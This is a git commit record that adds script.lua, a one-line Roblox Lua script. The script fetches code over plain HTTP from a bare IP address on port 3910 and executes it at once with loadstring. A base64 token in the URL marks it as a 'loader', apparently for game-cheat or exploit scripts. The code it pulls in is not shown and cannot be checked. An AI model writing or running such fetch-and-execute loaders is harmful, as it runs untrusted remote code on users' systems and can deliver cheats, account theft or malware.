c14219d4fc11d7dc50bb6d82e541c02339cc171d
Jekak121 <meijinemiko@gmail.com>
2026-03-19 17:34:56 +0700

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImFmMzBhZGUwLThiZjctNGE4Zi05ZGU3LTRmZDVhNzU1OWY2NCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
